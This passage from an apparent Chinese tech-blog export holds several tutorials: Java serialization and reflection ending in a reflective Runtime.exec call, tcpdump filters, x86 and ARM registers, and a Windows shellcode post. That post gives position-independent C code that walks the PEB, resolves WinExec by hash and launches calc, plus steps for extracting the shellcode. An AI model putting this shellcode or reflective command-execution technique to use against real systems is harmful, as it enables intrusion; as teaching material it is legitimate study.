2f 53 74 72 69 6e 67 3b“翻译”过来就是，字符串类型，占18个字节长度，变量名是 Ljava&#x2F;lang&#x2F;string;红色 id参数 int 类型绿色 name 参数 string 因为 String是引用数据类型所以调用了writeTypeString() 写入了Ljava&#x2F;lang&#x2F;string;黄色 phone 参数 string这里第一次看有个疑问phone参数也是string，但是他却没Ljava&#x2F;lang&#x2F;string;这一串后边又增加一个string的参数，确定同一种引用数据类型只写入一次。 循环执行完，返回到writeNonProxyDesc方法写入结束标志位0x78bout.writeByte(TC_ENDBLOCKDATA);准备开始写入序列化数据回到writeOrdinaryObject()方法writeSerialData(obj, desc);方法来写入序列化数据这里根据使用方式来判断，所以调用了 defaultWriteFields();第二个if是判断是否为基本数据类型，是的话就会直接写入序列化数据，不是的话向下到for循环附近获取变量数，然后循环调用writeObject0()；写入循环结束，直到所有运行完成，回到主函数。反序列化就不写了，反反过来推一遍就成。 java反射机制反射机制允许程序在运行期借助于Reflection API取得任何类的内部信息，并能直接操作任意类和对象的所有属性及方法。 要使用一个类，就要先把它加载到虚拟机中，在加载完类之后，堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个class对象），这个对象就包含了完整的类的结构信息，我们可以通过这个对象看到类的结构，这个对象就像一面镜子，透过镜子可以看到类的结构，所以形象的称之为：反射。实例： import java.lang.reflect.Method; public class test &#123; public static void main(String[] args) throws Exception &#123; a1Class a1 = new a1Class(); //通过运行时的对象调用getClass(); Class c = a1.getClass(); try &#123; //getMethod(方法名,参数类型) //getMethod第一个参数是方法名，第二个参数是该方法的参数类型 //因为存在同方法名不同参数这种情况，所以只有同时指定方法名和参数类型才能唯一确定一个方法 Method m1 = c.getMethod(&quot;print&quot;, int.class, int.class); //相当于r1.print(1, 2);方法的反射操作是用m1对象来进行方法调用 和r1.print调用的效果完全相同 //使用r1调用m1获得的对象所声明的公开方法即print，并将int类型的1,2作为参数传入 Object i = m1.invoke(a1,1,1); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; static class a1Class &#123; public void print(int a, int b) &#123; System.out.println(a + b); &#125; &#125; &#125; 尝试简化上面的代码创建另一个文件 public class testMiao &#123; public static void maio()&#123; System.out.println(&quot;miao!&quot;); &#125; &#125; 使用反射来执行miao(); public class test &#123; public static void main(String[] args) throws Exception &#123; try &#123; Object s = Class.forName(&quot;testMiao&quot;).getMethod(&quot;maio&quot;).invoke(null); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; 尝试添加参数简化public class testMiao &#123; public static void maio(String s)&#123; System.out.println(&quot;miao!&quot;+s); &#125; &#125; 反射 public class test &#123; public static void main(String[] args) throws Exception &#123; try &#123; Class.forName(&quot;testMiao&quot;).getMethod(&quot;maio&quot;, String.class).invoke(Class.forName(&quot;testMiao&quot;),&quot;aaa&quot;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; java执行命令java中可以使用Runtime.getRuntime.exec();来执行系统命令如：尝试使用反射来执行 Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(&quot;open /System/Applications/Calculator.app\\n&quot;); 这样会报错，报错的信息：是对象不是声明类的实例说明exec只能是通过getRuntime来执行 import java.lang.reflect.Method; public class test &#123; public static void main(String[] args) throws Exception &#123; Object o = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(o,&quot;open /System/Applications/Calculator.app\\n&quot;); &#125; &#125; 这样会成功，原理跟随反射实例第一个实例来理解。现在可以打开计算器，明白什么是序列与反序列化了。 关于cc1的链，之后再写，可以看bilibili 白日梦组长分析思路我个人觉得他的思路是真的超级棒。","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"tcpdump抓包","slug":"技/tcpDump","date":"2021-10-08T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/201a570f.html","link":"","permalink":"http://example.com/article/201a570f.html","excerpt":"","text":"抓包原理当网卡接收到一个网络报文后，会去遍历系统中所有已经注册了的网络协议，来尝试报文处理。 抓包模块会将自己伪装成一个网络协议，系统在遍历的时候就会发给抓包模块一份，抓包趁机将报文复制一份 tcpdump用法注意，需要root权限 使用 -w a .pcap 保存到数据包 tcpdump 抓取所有经过第一网络接口的数据包 tcpdump -i lo0 抓取某个网卡的数据 lo0是我本地网卡，用ifconfig可以查看 tcpdump -i en0 host 110.242.68.3 抓取经过en0 其目标地址或者源地址是110.242.68.3的数据包 tcpdump -i bridge100 host 192.168.150.1 and 192.168.150.14 抓取经过bridge100的主机192.168.150.1 与主机192.168.150.14间的流量包 tcpdump -i bridge100 -n host 192.168.150.1 and ! 192.168.150.14 抓取经过bridge100的主机192.168.150.1 与除了主机192.168.150.14的所有流量包 tcpdump src host 192.168.150.14 抓取主机192.168.150.14 发送的所有数据 tcpdump dst host 192.168.150.14 抓取所有流向192.168.150.14的数据 tcpdump host 192.168.150.14 and tcp port 80 抓取主机192.168.150.14所有在TCP 80端口的数据包： tcpdump host 192.168.150.14 and dst port 80 抓取主机192.168.150.14所有在http 80端口的数据包： tcpdump port 80 抓取80端口获取或者发送的数据，可以用dst和src来来区分 tcpdump net 192.168 抓取网络192.168的数据，可以用dst和src来来区分 tcpdump 协议名 过滤协议 tcpdump ‘((tcp) and (port 80) and ((dst host 192.168.150.1) or (dst host 192.168.150.14)))’ 目标是主机（192.168.150.1 或者192.168.150.14） 的 80端口的tcp的数据，注意理解其用法 tcpdump ‘tcp[tcpflags] &#x3D; tcp-syn’ 只抓syn包，如果要抓syn和ACK包 去掉等号及其后面 tcpdump ‘((port 25) and (tap[(tcp[12]&gt;&gt;2):4] &#x3D; 0x4d41494c))’ 抓取数据区开头为MAIL的包，MAIL的十六进制为 0x4d41494c tcpdump ‘tcp[(tcp[12] &gt;&gt; 2):4 &#x3D; 0x47455420]’ 抓取get包，get的十六进制0x47455420，post同理","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"Windows ShellCode提取加载与免杀","slug":"逆/ShellCode","date":"2021-09-06T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/570c6a7.html","link":"","permalink":"http://example.com/article/570c6a7.html","excerpt":"","text":"这篇文章仅讲windows下的，linux下比较简单，之后可能会写 shellcode是一段用于利用软件漏洞而执行的代码 编写首先说明，shellcode编写可以用c也可以直接用汇编来写，但难度不在一个层级，我们选择c》 vs我用的是vs2013，本来用的2008，但是找不到汇编窗口 下面是windows shellcode编写的步骤 获取kernel32.dll 基地址； 定位 GetProcAddress函数的地址； 使用GetProcAddress确定 LoadLibrary函数的地址； 然后使用 LoadLibrary加载DLL文件（例如user32.dll）； 使用 GetProcAddress查找某个函数的地址（例如MessageBox）； 指定函数参数； 调用函数。 首先要注意shellcode的地址无关原则 char* arr = &quot;test&quot;; 我们看到这么写的话 test存放在一个固定地址，而不同windows下的内存地址是不同的，所以我们不能将地址写死 char cmd[] = &#123; &#x27;c&#x27;,&#x27;a&#x27;,&#x27;l&#x27;,&#x27;c&#x27;,&#x27;\\x00&#x27;&#125;; 但上面这种写法就不会有固定地址，但这样写需要用\\x00来截断 现在地址无关解决，下一步是函数调用，我们需要kernel32.dll 基地址，但是由于ASLR导致dll可以加载到不同的内存位置，需要动态定位 PEB结构位于固定内存位置，所以我们可以通过PEB来获取。 读取PEB结构 跳转到0xC偏移处读取Ldr指针 跳转到0x14偏移处读取 InMemoryOrderModuleList字段 如果你不太懂上面三步，尽量多思考一下下面的内容 进程：是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，可以简单的理解为，计算机中每运行的一个软件都是一个进程。 PEB：是一个位于所有进程内存中固定位置的结构体。此结构体包含关于进程的有用信息，如可执行文件加载到内存的位置，模块列表（DLL），指示进程是否被调试的标志，还有许多其他的信息。 typedef struct _PEB &#123; BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; &#125; PEB, *PPEB; 上面是微软关于PEB结构体的官方文档， 上面内容的一些概念 BYTE表示1个字节 PVOID表示1个指针（或1个内存地址，ps：一定要弄明白指针这东西，很重要）在0x86中一个地址占四个字节 PPEB_LDR_DATA是1个指针，指向自定义结构体PEB_LDR_DATAPEB_LDR_DATA BeingDebugged标志是1个字节 Reserved1[2]是两个BYTE的数组，占两个字节 Reserved3[2]是两个PVOID指针的数组，占八个字节 我们重点关注下PEB_LDR_DATA（跳转到0xC偏移处读取Ldr指针 ） 跳转偏移计算：2 + 1 + 1 + 8 &#x3D; 12 &#x3D; 0xC typedef struct _PEB_LDR_DATA &#123; BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; &#125; PEB_LDR_DATA, *PPEB_LDR_DATA; 关注LIST_ENTRY InMemoryOrderModuleList（跳转到0x14偏移处读取 InMemoryOrderModuleList字段） 跳转偏移计算：8 + 12 &#x3D; 20 &#x3D; 0x14 typedef struct _LIST_ENTRY &#123; struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; &#125; LIST_ENTRY, *PLIST_ENTRY; LIST_ENTRY结构是一个简单的双向链表，包含指向下一个元素（Flink）的指针和指向上一个元素的指针（Blink） InMemoryOrderModuleList字段是一个指针，指向LDR_DATA_TABLE_ENTRY 结构体上的LIST_ENTRY字段。但是它不是指向 LDR_DATA_TABLE_ENTRY 起始位置的指针，而是指向这个结构的InMemoryOrderLinks字段。 上面操作完到了内存首个模块的InMemoryOrderLinks元素，这个模块是一个可执行文件（.exe），我们需要去遍历加载到内存的dll文件。 具体通过InMemoryOrderModuleList.Flink来访问第二个已加载的模块，通过循环操作就可以遍历所有已加载的模块 calc.exe ntdll.dll kernel32.dll 当我们通过遍历得到kernel32.dll后就可以完成下面操作了 获取kernel32.dll 基地址； 定位 GetProcAddress函数的地址； 使用GetProcAddress确定 LoadLibrary函数的地址； 然后使用 LoadLibrary加载DLL文件（例如user32.dll）； 使用 GetProcAddress查找某个函数的地址（例如MessageBox）； 指定函数参数； 调用函数。 这边有个代码模版，如果你实在不会写可以参考这个模版来理解上述操作 #include&lt;Windows.h&gt; #include&lt;winnt.h&gt; #include&lt;winternl.h&gt; DWORD getHash(char* str) &#123; DWORD h = 0; while (*str) &#123; h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13)); h += *str &gt;= &#x27;a&#x27; ? *str - 32 : *str; str++; &#125; return h; &#125; DWORD getunicodeHash(wchar_t* str) &#123; DWORD h = 0; PWORD ptr = (PWORD)str; while (*ptr) &#123; h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13)); h += (BYTE)(*ptr) &gt;= &#x27;a&#x27; ? (BYTE)(*ptr) - 32 : (BYTE)(*ptr); ptr++; &#125; return h; &#125; PVOID getWinExec() &#123; char dllname[] = &#123; &#x27;K&#x27;,&#x27;E&#x27;,&#x27;R&#x27;,&#x27;N&#x27;,&#x27;E&#x27;,&#x27;L&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;D&#x27;,&#x27;L&#x27;,&#x27;L&#x27;,&#x27;\\x00&#x27; &#125;; char api[] = &#123; &#x27;W&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;E&#x27;,&#x27;x&#x27;,&#x27;e&#x27;,&#x27;c&#x27;,&#x27;\\x00&#x27; &#125;; _PEB* peb = NtCurrentTeb()-&gt;ProcessEnvironmentBlock; LIST_ENTRY* first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink; LIST_ENTRY* ptr = first; do &#123; LDR_DATA_TABLE_ENTRY* dte = (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - 0x8); BYTE* baseAddress = (BYTE*)dte-&gt;DllBase; ptr = ptr-&gt;Flink; if (!baseAddress) continue; PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader-&gt;e_lfanew); DWORD iedRVA = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if (!iedRVA) continue; PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)(baseAddress + iedRVA); if (getunicodeHash(((decltype(dte-&gt;FullDllName)*)(DWORD*)&amp;(dte-&gt;Reserved4))-&gt;Buffer) == getHash(dllname)) &#123; DWORD* nameRVAs = (DWORD*)(baseAddress + ied-&gt;AddressOfNames); for (DWORD i = 0; i &lt; ied-&gt;NumberOfNames; i++) &#123; char* funcName = (char*)(baseAddress + nameRVAs[i]); if (getHash(funcName) == getHash(api)) &#123; WORD ordinal = ((WORD*)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i]; DWORD functionRVA = ((DWORD*)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal]; return baseAddress + functionRVA; &#125; &#125; &#125; &#125; while (ptr != first); return NULL; &#125; void func() &#123; char exec[] = &#123; &#x27;c&#x27;,&#x27;a&#x27;,&#x27;l&#x27;,&#x27;c&#x27;,&#x27;\\x00&#x27;&#125;; decltype(WinExec)* myWinExec = (decltype(WinExec)*)getWinExec(); myWinExec(exec, 0); &#125; int main() &#123; func(); return 0; &#125; 上面代码执行完之后会弹出windows计算器 这里不讲windows可利用shellcode的编写，cs，msf都已经提供了很好用的shellcode 提取shellcode的提取 使用c++开发代码 更改VisualStudio编译配置 生成exe 在IDA下打开生成的exe，获得机器码 开发代码我们已经完成了，接下来是编译 配置编译选项，下面很多是默认的 release在调试工具栏 使大小最小化 项目 - (你项目名称的)属性 - c&#x2F;c++ - 优化 - 最大优化（优选大小） 内联函数扩展 项目 - (你项目名称的)属性 - c&#x2F;c++ - 优化 - 函数扩展(只适用于_inline(Ob1)) 启用内部函数 项目 - (你项目名称的)属性 - c&#x2F;c++ - 优化 - 启用函数选择（是） 禁用安全检查(&#x2F;Gs-) 项目 - (你项目名称的)属性 - c&#x2F;c++ - 代码生成 - 安全检查（禁用） 启用函数级链接 项目 - (你项目名称的)属性 - c&#x2F;c++ - 代码生成 - 启用函数级链接(是) 增量链接 项目 - (你项目名称的)属性 - 链接器 - 常规 -启用增量链接 （否） 生成映射文件 项目 - (你项目名称的)属性 - 链接器 - 调试 - 生成映射文件 （是） 映射文件名随便写 启用COMDAT折叠 项目 - (你项目名称的)属性 - 链接器 - 优化 - 启用COMDAT折叠（是） 函数顺序 项目 - (你项目名称的)属性 - 链接器 - 优化 - 函数顺序 （function_order.txt） 关闭SDL检查 项目 - (你项目名称的)属性 - c&#x2F;c++ - SDL检查改为否 生成exe文件，用ida打开","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"intel x86寄存器及其汇编指令","slug":"逆/Intel_x86","date":"2021-08-29T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/ec08c5f4.html","link":"","permalink":"http://example.com/article/ec08c5f4.html","excerpt":"","text":"intel x86架构，复杂指令集，intel公司最成功的cpu架构。 x86代表32位架构 我们平时装计算机所说的64位，32位代表寻址能力不同，一些地方说是支持的内存，其本质还是寻址能力 32位最大寻址内存范围是2的32次方，即4GB 1B=1024K=2^10K 1GB=1024B=2^10B ∴4GB=2^2*2^10*2^10*2^10 =2^(2+10+10+10)=2^32``` 64位的最大寻址能力是2的64次方，即16384GB 但是，实际上限于种种原因，目前Windows 7 64位版仅能使用最大为192GB内存。 intel 系列向下兼容 具体发展历史和一些细节：https://baike.baidu.com/item/Intel%20x86/1012845?fr=aladdin 寄存器八个通用寄存器：EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI 一个标志寄存器：EFLAGS 五个控制寄存器：分别为CR0-CR4 八个调试寄存器：分别为DR0-DR7 四个系统地址寄存器：GDTR、IDTR、LDTR和TR 其他寄存器：EIP、TSC等 通用寄存器八个通用寄存器大多时候可以通用，但是某些寄存器有隐含用法。 EAX累加器，很多加法乘法指令的缺省寄存器。 EBX基地址(base)寄存器, 在内存寻址时存放基地址。 ECX是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。 EDX总是被用来放整数除法产生的余数。 ESI&#x2F;EDI分别叫做”源&#x2F;目标索引寄存器(source&#x2F;destination index)，因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目的串. 源串和目的串（也有的叫目标串）： 如在strcpy(*d, *s); 这里s指向的字符串就是源字符串，d指向的为目的字符串 EBP是基址指针(BASE POINTER)，它最经常被用作高级语言函数调用的”框架指针”(frame pointer) ESP专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。 一般esp到ebp这段空间就是当前栈 标志寄存器 包含一组状态标志，系统标志以及一个控制标志 CF若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置1，反之清零。 PF如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。 AF如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。 ZF若结果为0则将其置1，反之清零。 SF该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负) OF如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该位置1，反之清零。这个标志为带符号整型运算指示溢出状态。 DF控制串指令(MOVS, CMPS, SCAS, LODS以及STOS)。设置DF标志使得串指令自动递减（从高地址向低地址方向处理字符串），清除该标志则使得串指令自动递增。STD以及CLD指令分别用于设置以及清除DF标志。 TF将该位设置为1以允许单步调试模式，清零则禁用该模式。 IF该标志用于控制处理器对可屏蔽中断请求的响应。置1以响应可屏蔽中断，反之则禁止可屏蔽中断。 IOPL指示当前运行任务的I&#x2F;O特权级，正在运行任务的当前特权级(CPL)必须小于或等于I&#x2F;O特权级才能允许访问I&#x2F;O地址空间。这个域只能在CPL为0时才能通过POPF以及IRET指令修改。 NT这个标志控制中断链和被调用任务。若当前任务与前一个执行任务相关则置1，反之则清零。 RF控制处理器对调试异常的响应。 VM置1以允许虚拟8086模式，清除则返回保护模式。 AC标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。 VIF该标志是IF标志的虚拟镜像，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展 VIP该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零，与VIF标志结合使用。 ID 程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。 控制寄存器CR0PE：CR0的位0是启用保护标志。当设置该位时即开启了保护模式；当复位时即进入实地址模式。这个标志仅开启段级保护，而并没有启用 分页机制。若要启用 分页机制，那么PE和PG标志都要置位。 分页机制：https://baike.baidu.com/item/分页 PG：CR0的位31是分页标志。当设置该位时即开启了分页机制；当复位时则禁止分页机制，此时所有线性地址等同于 物理地址。在开启这个标志之前必须已经或者同时开启PE标志。即若要启用分页机制，那么PE和PG标志都要置位。 WP：对于Intel 80486或以上的CPU，CR0的位16是 写保护（Write Proctect）标志。当设置该标志时，处理器会禁止 超级用户程序（例如 特权级0的程序）向用户级只读页面执行写操作；当该位复位时则反之。该标志有利于UNIX类操作系统在创建进程时实现写时复制（Copy on Write）技术。NE：对于Intel 80486或以上的CPU，CR0的位5是 协处理器错误（Numeric Error）标志。当设置该标志时，就启用了x87 协处理器错误的内部报告机制；若复位该标志，那么就使用PC形式的x87协处理器 错误报告机制。当NE为复位状态并且CPU的IGNNE输入引脚有信号时，那么数学协处理器x87错误将被忽略。当NE为复位状态并且CPU的IGNNE输入引脚无信号时，那么非屏蔽的数学协处理器x87错误将导致处理器通过FERR引脚在外部产生一个中断，并且在执行下一个等待形式浮点指令或WAIT&#x2F;FWAIT指令之前立刻停止指令执行。CPU的FERR引脚用于仿真外部 协处理器80387的ERROR引脚，因此通常连接到中断控制器输入请求引脚上。NE标志、IGNNE引脚和FERR引脚用于利用外部逻辑来实现PC形式的外部 错误报告机制。 启用保护模式PE（Protected Enable）位（位0）和开启 分页PG（Paging）位（位31）分别用于控制分段和分页机制。PE用于控制分段机制。如果PE&#x3D;1，处理器就工作在开启分段机制环境下，即运行在保护模式下。如果PE&#x3D;0，则处理器关闭了分段机制，并如同8086工作于实地址模式下。PG用于控制 分页机制。如果PG&#x3D;1，则开启了 分页机制。如果PG&#x3D;0， 分页机制被禁止，此时 线性地址被直接作为 物理地址使用。 如果PE&#x3D;0、PG&#x3D;0，处理器工作在实地址模式下；如果PG&#x3D;0、PE&#x3D;1，处理器工作在没有开启 分页机制的保护模式下；如果PG&#x3D;1、PE&#x3D;0，此时由于不在保护模式下不能启用分页机制，因此处理器会产生一个一般保护异常，即这种标志组合无效；如果PG&#x3D;1、PE&#x3D;1，则处理器工作在开启了分页机制的保护模式下。 当改变PE和PG位时，必须小心。只有当执行程序至少有部分代码和数据在线性地址空间和物理地址空间中具有相同地址时，我们才能改变PG位的设置。此时这部分具有相同地址的代码在 分页和未分页世界之间起着桥梁的作用。无论是否开启分页机制，这部分代码都具有相同的地址。另外，在开启分页（PG&#x3D;1）之前必须先刷新页高速缓冲TLB。在修改该了PE位之后程序必须立刻使用一条跳转指令，以刷新处理器执行管道中已经获取的不同模式下的任何指令。在设置PE位之前，程序必须初始化几个系统段和控制寄存器。在系统刚上电时，处理器被复位成PE&#x3D;0和PG&#x3D;0（即实模式状态），以允许引导代码在启用分段和分页机制之前能够初始化这些寄存器和数据结构。 CR2和CR3CR2和CR3用于分页机制。CR3含有存放页目录表页面的物理地址，因此CR3也被称为PDBR。因为页目录表页面是页对齐的，所以该寄存器只有高20位是有效的。而低12位保留供更高级处理器使用，因此在往CR3中加载一个新值时低12位必须设置为0。 调试寄存器GDTR全局描述符表寄存器，用于存放全局描述符表GDT的32位的线性基地址和16位的表限长值。基地址指定GDT表中字节0在线性地址空间中的地址，表长度指明GDT表的字节长度值。指令LGDT和SGDT分别用于加载和保存GDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。在保护模式初始化过程中必须给GDTR加载一个新值。 IDTR中断描述符表寄存器，与GDTR的作用类似，IDTR寄存器用于存放中断描述符表IDT的32位线性基地址和16位表长度值。指令LIDT和SIDT分别用于加载和保存IDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。 LDTR用于存放局部描述符表LDT的32位线性基地址、16位段限长和描述符属性值。指令LLDT和SLDT分别用于加载和保存LDTR寄存器的段描述符部分，包含LDT EIP存储我们cpu要读取指令的地址 TSC一个用于时间戳计数器的64位的寄存器，它在每个时钟信号到来时加一 指令集数据传送指令MOVmov指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存 pushpush指令将操作数压入内存的栈中 pop与push相反，将操作数从栈中取出 lea lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中 lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。 算术和逻辑指令ADD将两个操作数相加，且将相加后的结果保存到第一个操作数中。 SUB第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数。 INC和DECinc,dec分别表示将操作数自加1，自减1。 IMUL整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器 IDIVidiv指令完成整数除法操作，idiv只有一个操作数，此操作数为除数，而被除数则为EDX:EAX中的内容（一个64位的整数）。 AND, OR, XOR逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。 NOT位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。 NEG取负指令。 SHL, SHR位移指令，有两个操作数，第一个操作数表示被操作数，第二个操作数指示位移的数量。 控制转移指令JMP控制转移到label所指示的地址。 jcondition条件转移指令，条件转移指令依据机器状态字中的一些列条件状态转移。机器状态字中包括指示最后一个算数运算结果是否为0，运算结果是否为负数等。 je (jump when equal)jne (jump when not equal)jz (jump when last result was zero)jg (jump when greater than)jge (jump when greater than or equal to)jl (jump when less than)jle (jump when less than or equal to) CMPcmp指令比较两个操作数的值，并根据比较结果设置机器状态字中的条件码。此指令与sub指令类似，但是cmp不用将计算结果保存在操作数中。 CALL, RET这两条指令实现子程序（过程、函数等意思）的调用及返回。call指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，call指令保存调用之前的地址信息（当call指令结束后，返回到调用之前的地址）。 ret指令实现子程序的返回机制，ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"三级流水线","slug":"技/ThreeStagePipeline","date":"2021-08-22T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/f5705223.html","link":"","permalink":"http://example.com/article/f5705223.html","excerpt":"","text":"一般处理器执行代码程序为，读一条，执行一条 而流水线则使用三个阶段处理： 取指，从储存器中取出指令 译码，识别指令 执行，处理指令，并将结果放回寄存器 arm可以在执行第一条指令的时候，对第二条指令进行译码，并且取出第三条指令 但是！ 无论处理器处于何种状态，程序计数器R15(PC)总是指向“正在取指”的指令，而不是指向“正在执行”的指令或者正在“译码”的指令 人们常以正在执行的指令做第一条参考，所以pc总是指向第三条指令，或者说是指向正在执行的指令地址再加两条指令地址 处理器处于ARM状态时，每条指令为4个字节，所以PC值为正在执行的指令地址加8字节，即是： PC值 &#x3D; 当前程序执行位置 + 8字节 处理器处于Thumb状态时，每条指令为2字节，所以PC值为正在执行的指令地址加4字节，即是： PC值 &#x3D; 当前程序执行位置 + 4字节","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"ARM寄存器及其汇编指令","slug":"逆/arm","date":"2021-08-16T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/c21195a7.html","link":"","permalink":"http://example.com/article/c21195a7.html","excerpt":"","text":"ARM处理器第一款RISC（精简指令集）微处理器，（arm）32位设计，但配有16位指令集（thumb） 32位和16位可以相互调用，且开销几乎为0 使用大量寄存器，功耗低，效率高 ps：具体发展，系列之类请参考百度百科：https://baike.baidu.com/item/arm/5907 arm寄存器arm包括37个寄存器，都是32位 31个通用寄存器，6个状态寄存器 arm有7种处理器模式，每个模式中有一组相应的寄存器 在任何一种处理器模式下可见的寄存器包括15个通用寄存器（r0-r14），一个或者两个状态寄存器，程序技术器（pc） 所有寄存器中，有些是各模式公用的物理寄存器，有些是某个模式独立拥有的物理寄存器 七个处理器模式： 用户模式（User），快速中断模式（FIQ），普通中断模式（IRQ），管理模式（Svc），数据访问中止模 （Abort），未定义指令中止模式（Und），系统模式（Sys） 寄存器用途r0 - r3：传参 r4 - r11：保存局部变量，但在thumb（16位程序）中，通常只能用r4-r7来保存局部变量 r12：ip寄存器 r13：栈帧，即sp r14：lr，被称为连接寄存器，用于保存子程序以及中断的返回地址 r15：程序计数器，即pc，但由于arm使用的是三级流水线结构，所以我们读取正确的pc的值之后应该在该值基础上加八个字节，即指向pc下两条指令的地址 ps：关于三级流水线，另一片相关文章会具体解释 CPSR：当前程序状态寄存器，在任何模式下可以被访问。包含条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位。CPSR在用户编程时由于存储条件码。 